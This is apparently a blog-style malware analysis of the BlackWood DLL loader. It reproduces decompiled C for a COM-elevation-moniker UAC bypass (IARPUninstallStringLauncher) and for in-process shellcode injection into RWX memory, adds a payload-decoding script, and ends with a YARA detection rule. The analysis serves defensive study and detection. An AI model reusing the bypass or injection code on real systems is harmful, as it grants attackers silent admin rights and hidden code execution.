---
ID: 20240520125600
title: A Quick Look at BlackWood DLL Loader
description: Exploring VXUnderground and chanced upon a DLL Loader from 2024, and so why not take a look at it?
tags:
  - Blogging
  - Malware_Analysis/BlackWoodLoader
  - UAC_Bypass
  - Process_Injection
Created: 2024-05-20 12:56:00
Last Modified: 2024-05-20 12:56:00
date: 2024/05/20
---


# Black Wood DLL Loader


## Description
Was searching through VX Underground's Archive and saw DLL loader. Also, taking this as an excuse to try out [yara-x](https://github.com/VirusTotal/yara-x)

This loader is interesting as it attempts to do **UAC bypass** by retrieving COM objects specifically 
`IARPUninstallStringLauncher` to obtain admin privilege.

It also decrypts a large content that was hardcoded in the binary that is used for **process injection**.

## Malware Details
<div class="table-container">
  <table>
    <tr><th>Name</th><th>SHA256</th><th>Description</th></tr>
    <tr><td>agent.dll</td><td>72B81424D6235F17B3FC393958481E0316C63CA7AB9907914B5A737BA1AD2374</td><td>BlackWood DLL Loader</td>
  </tr>
  </table>
</div>


# Quick Peek
There are just a few functions. Just 5 functions in total.
## Ordinal 1 - `agent_1-sub_10001A70`
1. Checks if the current executable is `run32dll.exe`.
2. If yes, then attempt to bypass UAC with `sub_100013E0`

```c
void __stdcall agent_1(int a1, int a2, int a3, int a4)
{
  if ( check_current_exe_is_rundll32_sub_10001990() )
    UAC_Bypass_sub_100013E0();
}
```
## sub_100013E0 - UAC Bypass

According to [Elastic Security Labs - https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies):

> UAC bypass methods usually result in hijacking the normal execution flow of an elevated application by spawning a malicious child process or loading a malicious module inheriting the elevated integrity level of the targeted application.

They are:
1. Registry Key Manipulation
2. DLL Hijack
3. Elevated COM Interface.

This BlackWood DLL loader attempts to instantiate and interact with COM object that requires admin privileges. UAC bypassed leveraging the COM Elevation Moniker to create and interact with elevated COM object.

- `Elevation:Administrator!new:{FCC74B77-EC3E-4DD8-A80B-008A702075A9}`
    - https://gist.github.com/Elm0D/de94d428ef8c45b7cd24409b5c343a33
    - https://strontic.github.io/xcyclopedia/library/clsid_FCC74B77-EC3E-4dd8-A80B-008A702075A9.html
  ```
     ARP UninstallString Launcher
    {FCC74B77-EC3E-4dd8-A80B-008A702075A9}
  ```
- `{F885120E-3789-4fd9-865E-DC9B4A6412D2}`
    - This is CLSID for `IARPUninstallStringLauncher`
    - Found from Registry `InProcServer32`
    - `C:\Windows\system32\appwiz.cpl`
    - https://strontic.github.io/xcyclopedia/library/clsid_F885120E-3789-4fd9-865E-DC9B4A6412D2.html#inprocserver32
    - Very likely used to bypass UAC
        - https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher.cpp
        - https://3gstudent.github.io/backup-3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IARPUninstallStringLauncher%E7%BB%95%E8%BF%87UAC/

> [!note] From 3gstudent
> 通过COM组件IARPUninstallStringLauncher绕过UAC
> 在我搜索到HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{FCC74B77-EC3E-4dd8-A80B-008A702075A9}时，获得名称ARP UninstallString Launcher

### Steps
1. GUID and IID creation
2. Copies `Elevation:Administrator!new:{FCC74B77-EC3E-4DD8-A80B-008A702075A9}` into `pszName` which is used for COM Elevation Moniker, used to request elevation for COM objects.
3. Initialization of COM Object via `CoInitialize(0)`
4. Setting up Bin Options to size 36
5. Get the elevated COM Object via `CoGetObject` function which yields `ppv`, an interface pointer to COM object with elevated privileges.
6. Retrieves two different pointers.
    - `LaunchUninstallStringAndWait`
    - `IARPUninstallStringLauncher_Release`
7. Prepares the second GUID string
8. `LaunchUninstallStringAndWait` is called with constructed GUID
9. `IARPUninstallStringLauncher_Release` releases COM Object
10. Unitializes the COM library

This works because once the evelated COM object is obtained, any method calls on this object are executed with admin rights. This allows the function to perform tasks that normally require elevated privlege without directly invoking a UAC prompt within the code.

```c
void sub_100013E0()
{
  void (__stdcall *pfn_LaunchUninstallStringAndWait)(void *, _DWORD, __int16 *, _DWORD, _DWORD); // eax
  void (__stdcall *pfn_IARPUninstallStringLauncher_Release)(void *); // edi
  void *ppv; // [esp+14h] [ebp-160h] BYREF
  OLECHAR sz[40]; // [esp+18h] [ebp-15Ch] BYREF
  __int16 v4[40]; // [esp+68h] [ebp-10Ch] BYREF
  WCHAR pszName[68]; // [esp+B8h] [ebp-BCh] BYREF
  BIND_OPTS pBindOptions; // [esp+140h] [ebp-34h] BYREF
  int v7; // [esp+154h] [ebp-20h]
  int v8; // [esp+160h] [ebp-14h]
  IID iid; // [esp+164h] [ebp-10h] BYREF

  sz[1] = 'F';
  sz[16] = 'F';
  sz[6] = '2';
  sz[34] = '2';
  sz[36] = '2';
  sz[13] = '9';
  sz[18] = '9';
  sz[27] = '9';
  sz[17] = 'D';
  sz[25] = 'D';
  ppv = 0;
  sz[0] = '{';
  sz[2] = '8';
  sz[3] = '8';
  sz[4] = '5';
  sz[5] = '1';
  sz[7] = '0';
  sz[8] = 'E';
  sz[9] = '-';
  sz[10] = '3';
  sz[11] = '7';
  sz[12] = '8';
  sz[14] = '-';
  sz[15] = '4';
  sz[19] = '-';
  sz[20] = '8';
  sz[21] = '6';
  sz[22] = '5';
  sz[23] = 'E';
  sz[24] = '-';
  sz[26] = 'C';
  sz[28] = 'B';
  sz[29] = '4';
  sz[30] = 'A';
  sz[31] = '6';
  sz[32] = '4';
  sz[33] = '1';
  sz[35] = 'D';
  sz[37] = '}';
  sz[38] = '\0';

  // {F885120E-3789-4fd9-865E-DC9B4A6412D2} - CLSID for `IARPUninstallStringLauncher
  if ( !IIDFromString(sz, &iid) )
  {
    wcscpy(pszName, L"Elevation:Administrator!new:{FCC74B77-EC3E-4DD8-A80B-008A702075A9}");
    CoInitialize(0);
    memset(&pBindOptions, 0, 0x24u);
    v8 = 0;
    pBindOptions.cbStruct = 36;
    v7 = 4;


    // Getting COM Object
    if ( CoGetObject(pszName, &pBindOptions, &iid, &ppv) >= 0 )
    {
      pfn_LaunchUninstallStringAndWait = *(void (__stdcall **)(void *, _DWORD, __int16 *, _DWORD, _DWORD))(*(_DWORD *)ppv + 12);
      pfn_IARPUninstallStringLauncher_Release = *(void (__stdcall **)(void *))(*(_DWORD *)ppv + 8);
      if ( pfn_LaunchUninstallStringAndWait )
      {
        if ( pfn_IARPUninstallStringLauncher_Release )
        {
          v4[3] = 'B';
          v4[5] = 'B';
          v4[6] = 'D';
          v4[27] = 'D';
          v4[34] = 'D';
          v4[35] = 'D';
          v4[9] = '-';
          v4[14] = '-';
          v4[19] = '-';
          v4[24] = '-';
          v4[0] = '{';
          v4[1] = '3';
          v4[2] = 'E';
          v4[4] = '0';
          v4[7] = 'B';
          v4[8] = '8';
          v4[10] = '1';
          v4[11] = 'B';
          v4[12] = 'E';
          v4[13] = '5';
          v4[15] = '4';
          v4[16] = '9';
          v4[17] = '1';
          v4[18] = '8';
          v4[20] = 'A';
          v4[21] = '7';
          v4[22] = '8';
          v4[23] = '8';
          v4[25] = 'A';
          v4[26] = '5';
          v4[28] = '2';
          v4[29] = 'F';
          v4[30] = 'C';
          v4[31] = 'A';
          v4[32] = '2';
          v4[33] = 'E';
          v4[36] = 'A';
          v4[37] = '}';
          v4[38] = '\0';
          pfn_LaunchUninstallStringAndWait(ppv, '\0', v4, 0, 0);
          pfn_IARPUninstallStringLauncher_Release(ppv);
        }
      }
    }
    CoUninitialize();
  }
}
```

## DllMain - Anti-Debugger

Dll main contains a simple check to see if there is a potential debugger running. It does so by checking if an instance rundll32.exe is running.

1. Retrieve its own filename
2. If current exectuable is rundll32.exe, return
3. If current executable is NOT rundll32.exe, then sub_10001170


```c
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  BOOL is_rundll32_exe; 

  is_rundll32_exe = check_current_exe_is_rundll32_sub_10001990();
  if ( fdwReason == 1 )
  {
    GetModuleFileNameA(hinstDLL, Filename, 0x104u);
    if ( !is_rundll32_exe )
      sub_10001170();
  }
  return is_rundll32_exe;
}
```

### ProcessInjection_sub_10001170

1. Forms Update.ini path directory same path of Filename
2. Reads from `Update.ini` file the key "Update" under the "SET" section via `GetPrivateProfileStringA`
    - https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getprivateprofilestringa 
    - Interestingly, according to MSDN, `This function is provided only for compatibility with 16-bit Windows-based applications. Applications should store initialization information in the registry.`
4.  It deletes and sleep for 1 second after the file specified by the `ReturnedString` from `GetPrivateProfileStringA` if successful retrieved.
5.  It deletes the `Update.ini` file either ways.
6.  It now retrieve the module handle for the current process and passed into `sub_10001000` to get the address of `ExitProcess`
7.  If `sub_10001000` is successful, then it would proceed to decode a large chunk of bytes. See the **Decoding a large chunk of bytes** section below.

#### Process Injection
8. Current PID is being retrieved via `GetCurrentProcessId`
9. The process handle is retrieved using the current PID.
10. Memory of size 0x1354u is allocated with RWX permissions.
11. It appends and copy data into specific locations within the allocated memory using contents from the decoded chunk of bytes.
12. It iterates through the memory, do some checks and modify pointers or values based on conditions.
13. After that, code is executed from `((void (*)(void))(v8 + 4))();`


### Decoding a large chunk of bytes
The following is the algorithm to decode the large chunk of bytes.

```python
# IDA Python

byte_10003010 = get_bytes(0x10003010,4436)
byte_1000300F = [0] * len(byte_10003010)
for i in range(len(byte_10003010)):
    byte_1000300F[i] = ~byte_10003010[i] & 0xFF  # Apply bitwise NOT and mask to 8 bits
hex_values = [f"{byte:x}" for byte in byte_1000300F]
print ("\\x"+ "\\x".join(hex_values))
```

The following shows the `sub_10001170` that does process injection

```c
int ProcessInjection_sub_10001170()
{
  char *v0; // eax
  HMODULE ModuleHandleA; // eax
  int i; // eax
  char v3; // cl
  DWORD CurrentProcessId; // eax
  HANDLE v5; // eax
  char *rwx_memory; // eax
  char *rwx_memory1; // ebx
  char *v8; // edx
  int v9; // ebp
  int *v10; // eax
  int v11; // esi
  int v12; // ecx
  int v13; // ecx
  int *v15; // [esp+10h] [ebp-210h]
  char Str[257]; // [esp+18h] [ebp-208h] BYREF
  __int16 v17; // [esp+119h] [ebp-107h]
  char v18; // [esp+11Bh] [ebp-105h]
  CHAR ReturnedString[257]; // [esp+11Ch] [ebp-104h] BYREF
  __int16 v20; // [esp+21Dh] [ebp-3h]
  char v21; // [esp+21Fh] [ebp-1h]

  memset(Str, 0, sizeof(Str));
  v17 = 0;
  v18 = 0;
  strcat(Str, Filename);


  // Find last occurrence of \\
  v0 = strrchr(Str, '\\');
  if ( v0 )
  {

    // Truncates after the last occurrence of \\ to get the current path
    v0[1] = 0;

    strcat(Str, aUpdateIni);                    // Update.ini
    memset(ReturnedString, 0, sizeof(ReturnedString));
    v20 = 0;
    v21 = 0;


    // AppName -> "SET"
    // KeyName -> "Update"
    if ( GetPrivateProfileStringA(AppName, KeyName, Default, ReturnedString, 0x104u, Str) )
    {
      Sleep(0x3E8u);
      DeleteFileA(ReturnedString);
    }
    DeleteFileA(Str);
  }
  ModuleHandleA = GetModuleHandleA(0);
  v15 = (int *)ExitProcess_Address_sub_10001000((PIMAGE_DOS_HEADER)ModuleHandleA);
  if ( v15 )
  {
    for ( i = 0; i < 4436; byte_1000300F[i] = ~v3 )
      v3 = decrypted_byte_10003010[i++];
    CurrentProcessId = GetCurrentProcessId();
    v5 = OpenProcess(8u, 0, CurrentProcessId);
    rwx_memory = (char *)VirtualAllocEx(v5, 0, 0x1354u, 0x3000u, PAGE_EXECUTE_READWRITE);
    if ( rwx_memory )
    {
      rwx_memory1 = rwx_memory;
      v8 = rwx_memory + 0x200;
      strcat(rwx_memory, Filename);
      strcat(rwx_memory, aTxt);
      strcat(rwx_memory + 0x100, Filename);
      qmemcpy(rwx_memory + 0x200, decrypted_byte_10003010, 0x1154u);
      v9 = *((_DWORD *)rwx_memory + 0x80);
      v10 = (int *)(rwx_memory + 0x204);
      v11 = 4436;
      while ( 1 )
      {
        v12 = *v10;
        if ( *v10 == 0x334455 )
          break;
        switch ( v12 )
        {
          case 0x223344:
            v13 = *v15;
            goto LABEL_20;
          case 0x445566:
            v13 = (int)&v8[v9 + 4];
            goto LABEL_20;
          case 0x556677:
            *v10 = (int)rwx_memory1;
            break;
          case 0x667788:
            v13 = (int)(rwx_memory1 + 0x100);
            goto LABEL_20;
        }
LABEL_21:
        v10 = (int *)((char *)v10 + 1);
        if ( --v11 <= 4 )
        {
          ((void (*)(void))(v8 + 4))();         // Execute memory from v8+4
          return 0;
        }
      }
      v13 = (int)v15;
LABEL_20:
      *v10 = v13;
      goto LABEL_21;
    }
  }
  return 0;
}
```

## Yara Rules

1. Put YARA in a folder called rules

```python
rule BlackWood_DLL_Loader
{
    meta:
        description = "Simple Rule to detect BlockWood DLL loader, agent.dll"
        author = "Owl4444"
        date = "2024-05-19"
    
    strings:

        $string1 = "333333333333333.txt" ascii
        $string2 = "agent.dll" ascii
        $string3 = "Update.ini" ascii
        $string4 = "OpenProcess"  ascii
        $string5 =  "IIDFromString" ascii 
        
        // Delimiters used for decoded chunk for process injection
        $delim0 = {44 33 22 00}
        $delim1 = {55 44 33 00}  
        $delim2 = {66 55 44 00}
        $delim3 = {77 66 55 00}
        $delim4 = {88 77 66 00}

    condition:
        all of ($string*) and all of ($delim*)
}
```

2. Run scan
```
yr.exe scan rules .
BlackWood \\?\M:\BlackWood\output_yar
BlackWood \\?\M:\BlackWood\rules\blackwood.yar
BlackWood \\?\M:\BlackWood\72b81424d6235f17b3fc393958481e0316c63ca7ab9907914b5a737ba1ad2374
────────────────────────────────────────────────────────────────────────────────────────────── 
 5 file(s) scanned in 0.5s. 3 file(s) matched.
```


## Reference
- [https://blog.sonicwall.com/en-us/2024/01/blackwood-apt-group-has-a-new-dll-loader/](https://blog.sonicwall.com/en-us/2024/01/blackwood-apt-group-has-a-new-dll-loader/)
- [https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies)
- [https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher.cpp](https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher.cpp)
- [https://strontic.github.io/xcyclopedia/library/clsid_FCC74B77-EC3E-4dd8-A80B-008A702075A9.html](https://strontic.github.io/xcyclopedia/library/clsid_FCC74B77-EC3E-4dd8-A80B-008A702075A9.html)
